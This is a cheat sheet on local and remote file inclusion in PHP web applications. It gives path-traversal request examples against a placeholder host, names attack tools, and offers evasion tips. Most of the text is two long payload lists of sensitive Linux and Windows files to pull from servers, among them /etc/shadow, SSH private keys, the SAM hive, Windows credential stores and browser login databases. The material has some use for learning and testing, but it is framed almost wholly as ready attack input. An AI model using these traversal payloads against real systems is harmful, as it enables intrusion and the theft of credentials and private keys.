### *What is file inclusion?*
**Remote File Inclusion (RFI)**: The file is loaded from a remote server (Best: You can write the code and the server will execute it). In PHP this is disabled by default (allow_url_include). **Local File Inclusion (LFI)**: The sever loads a local file.

**Vulnerable PHP functions**: require, require_once, include, include_once

> Try to change `/` for `\`
> Try to remove `C:/` and add `../../../../../`
### *Tools*
https://github.com/kurobeats/fimap
https://github.com/xmendez/wfuzz
### *Examples*

### *dot-dot-slash*
**Linux**
You can view hidden files in a web application. Generally web applications are stored in `/var/www/app/` or something similar. 

Locate an endpoint with functionality to retrieve files from the server. 
```
http://vulnerable.com/images/getimage.php?file=image.png
```

Try to escape this and view contents of other files on server. Currently you are in `/var/www/app/`
```
http://vulnerable.com/images/getimage.php?file=../../../../etc/passwd
```

[Use this list of common sensitive Linux files](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Linux-Sensitive-Files.txt)
```
/etc/aliases
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apt/sources.list
/etc/dovecot/dovecot.conf
/etc/environment
/etc/group
/etc/gshadow
/etc/hostname
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/httpd.conf
/etc/issue
/etc/mail/aliases
/etc/mail/sendmail.cf
/etc/mime.types
/etc/mongodb.conf
/etc/my.cnf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/nginx/nginx.conf
/etc/nsswitch.conf
/etc/passwd
/etc/php/7.4/apache2/php.ini
/etc/php/7.4/cli/php.ini
/etc/php/7.4/fpm/php.ini
/etc/php.ini
/etc/postfix/main.cf
/etc/redis/redis.conf
/etc/resolv.conf
/etc/profile
/etc/samba/smb.conf
/etc/shadow
/etc/ssh/id_dsa
/etc/ssh/id_ecdsa
/etc/ssh/id_ed25519
/etc/ssh/id_rsa
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
/etc/ssh/known_hosts
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/sysctl.conf
/root/.bash_history
/root/.my.cnf
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/var/log/dmessage
/proc/mounts
/root/.ssh/id_rsa
/proc/net/arp
/proc/net/route
/proc/net/tcp
/var/mail/root
/proc/net/udp
/var/log/auth.log
/var/log/secure
/var/log/boot.log
/var/log/cron
/var/log/dmesg
/var/log/lastlog
/var/log/wtmp
/var/log/btmp
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/mysql/error.log
/var/log/postgresql/postgresql.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/daemon.log
/var/log/kern.log
/var/log/maillog
/var/log/xorg.log
/var/log/alternatives.log
/var/log/dpkg.log
/var/log/faillog
/var/log/user.log
/var/log/cups/error_log
/var/log/yum.log
/var/log/audit/audit.log
/var/log/messages
/var/log/ufw.log
/var/log/clamav/clamav.log
/var/log/sshd.log
/var/log/samba/log.smbd
/var/log/samba/log.nmbd
/var/log/ntp.log
/var/log/cron
/var/log/secure
/var/log/acpid
/var/log/auth.log
/var/log/mail.info
/home/$USER/.config/google-chrome-beta/Default/Login\ Data
/home/$USER/.config/google-chrome/Default/Login\ Data
/home/$USER/.config/google-chrome/Default/Session\ Storage/LOG
/home/$USER/.config/Code/Cookies
/home/$USER/.config/Code/databases/Databases.db
/home/$USER/.config/google-chrome/Default/databases/Databases.db
/home/$USER/.config/google-chrome-beta/Default/databases/Databases.db
/home/$USER/.config/Code/CachedProfilesData/__default__profile__/extensions.user.cache
/home/$USER/.config/google-chrome/Default/Web\ Data
/home/$USER/.config/google-chrome/Default/Session Storage/LOG
/home/$USER/.config/google-chrome/Default/Preferences
```

**Windows**
Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the `boot.ini` file located in `c:\boot.ini`, then the attacker can try the following depending on the target OS version:
```
http://vulnerable.com/images/getimage.php?file=c:\boot.ini
```

[Use this list of common sensitive windows files.](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Windows-Sensitive-Files.txt)
```
C:\Windows\System32\config\SAM
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot
C:\inetpub\wwwroot\default.htm
C:\laragon\bin\php\php.ini
C:\php\php.ini
C:\Users\{username}\Documents
C:\Users\{username}\AppData\Local\FileZilla
C:\Users\{username}\AppData\Local\FileZilla\cache.xml
C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data
C:\Users\{username}\AppData\Local\Microsoft\Windows\UsrClass.dat
C:\Users\{username}\AppData\Local\Programs\Microsoft VS Code\updater.log
C:\Users{username}\AppData\Roaming\Code\User\settings.json
C:\Users\{username}\AppData\Roaming\Code\User\workspaceStorage
C:\Users\{username}\AppData\Roaming\FileZilla\filezilla-server.xml
C:\Users\{username}\AppData\Roaming\FileZilla\filezilla.xml
C:\Users\{username}\AppData\Roaming\FileZilla\logs
C:\Users\{username}\AppData\Roaming\FileZilla\recentservers.xml
C:\Users\{username}\AppData\Roaming\FileZilla\sitemanager.xml
C:\Users\{username}\AppData\Roaming\Microsoft\Credentials
C:\Users\{username}\AppData\Roaming\Microsoft\Outlook
C:\Users\{username}\NTUSER.DAT
C:\Users\{username}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
C:\wamp\bin\php\php.ini
C:\Windows\php.ini
C:\Windows\System32\config
C:\Windows\system32\config\NTUSER.DAT
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\GroupPolicy
C:\Windows\System32\GroupPolicyUsers
C:\Windows\System32\inetsrv\config\administration.config
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\System32\inetsrv\config\applicationHost.hist
C:\Windows\System32\inetsrv\config\monitoring\global.xml
C:\Windows\System32\inetsrv\config\redirection.config
C:\Windows\System32\inetsrv\config\schema\applicationHost.xsd
C:\Windows\System32\inetsrv\config\schema\ASPNET_schema.xml
C:\Windows\System32\inetsrv\config\schema\dotnetconfig.xsd
C:\Windows\System32\inetsrv\config\schema\IISProvider_schema.xml
C:\Windows\System32\inetsrv\config\schema\IIS_schema.xml
C:\Windows\System32\inetsrv\config\schema\rewrite_schema.xml
C:\Windows\System32\LogFiles
C:\Windows\System32\LogFiles\W3SVC1
C:\Windows\System32\winevt\Logs
C:\Windows\system.ini
C:\Windows\Prefetch
C:\xampp\apache\conf\extra\httpd-ssl.conf
C:\xampp\apache\conf\extra\httpd-vhosts.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\php_error_log
C:\xampp\phpMyAdmin\config.inc.php
C:\xampp\php\php.ini
C:\xampp\xampp-control.log
```
